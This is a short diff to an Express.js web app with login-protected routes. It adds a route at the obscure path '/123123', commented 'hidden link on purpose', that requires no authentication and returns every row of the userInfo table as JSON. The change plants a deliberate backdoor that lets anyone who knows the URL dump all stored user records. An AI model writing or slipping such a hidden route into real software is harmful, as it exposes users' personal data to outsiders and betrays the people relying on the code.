@@ -131,6 +131,13 @@ app.post('/users', checkAuthenticated, (req, res) => {
   res.render('./authapp/users.ejs')
 })
 
+// hidden link on purpose
+app.get('/123123', (req, res) => { 
+  connection.query("SELECT * from userInfo;", (err, rows, fields) => {
+      res.json(rows);
+  });
+});
+
 app.delete('/logout', (req, res) => {
   // logout() is now an async function after version 0.6.0
   req.logOut(function (err) {
